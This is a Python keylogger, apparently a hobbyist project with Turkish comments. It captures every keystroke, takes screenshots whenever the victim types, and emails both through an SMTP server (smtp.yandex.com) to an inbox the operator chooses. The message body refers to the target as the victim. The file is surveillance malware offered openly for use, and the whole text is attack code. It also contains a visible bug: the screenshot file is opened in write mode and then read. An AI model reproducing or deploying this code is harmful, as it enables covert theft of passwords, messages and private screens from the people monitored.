import os
import threading
import smtplib
from PIL import ImageGrab
from time import sleep
from email.message import EmailMessage
from pynput.keyboard import Key,KeyCode,Listener

#Bendeniz SemsYapar kodlamıştır
#Keyloggerımızın screenshot ve klavye kaydı özellikleri mevcuttur
#son hali değildir geliştirilmeye ve değiştirlemye açıktır

data=""
count=10#veri aktarımı aralığını saniye olarak ifade eder isteğe bağlı olarak değiştirilebilir
def mail_at():
    global data,count
    
    dosyam = EmailMessage()
    dosyam["Subject"] = "Keylogs"
    dosyam["From"] = "dosyayı attığınız mail"#DOLDURUNUZ
    dosyam["To"] = "dosyanın iletilmesini istediğiniz mail"#DOLDURUNUZ
    password = "mail şifresi"#DOLDURUNUZ
    
    dosyam.set_content(f"kurbanin {count} ekran goruntuleri ve klavye hareketleri..\n\n{data}")


    with open("Data\\ScreenShot.png","wb") as dosya:#dosya ismi isteğe bağlı uzantısıyla hariç değiştirilebilir
        dosyam_data = dosya.read()
        dosyam_name = dosya.name
    dosyam.add_attachment(dosyam_data,maintype = "application",subtype = "octet-stream",filename = dosyam_name)

    mail = smtplib.SMTP("smtp.yandex.com",587)
    mail.ehlo()
    mail.starttls()
    mail.login(dosyam["From"],password)
    mail.send_message(dosyam)
    mail.quit()

def klavye_dinle():
    with Listener(on_press=klavye_kaydet) as klavye_dinle:
        klavye_dinle.join()
        
def klavye_kaydet(harf):
    global data
    if type(harf) == Key:
        harf = "[{}]".format(harf).replace("Key.","").upper()
        data += harf
    if type(harf) == KeyCode:
        data += str(harf).replace("'","")
def ss_bekle():    
    global data,count
    temp=data
    while True:
        if len(temp)!=len(data):
            sleep(count)
            ss=ImageGrab.grab()
            ss.save("Data\\ScreenShot.png","JPEG")#dosya ismi isteğe bağlı uzantısıyla hariç değiştirilebilir
            temp=data
            mail_at()
            data=""
            os.remove("Data\\ScreenShot.png")#dosya ismi isteğe bağlı uzantısıyla hariç değiştirilebilir
            continue
        else:
            continue

thread1 = threading.Thread(target = klavye_dinle)
thread2 = threading.Thread(target = ss_bekle)

thread1.start()
thread2.start()

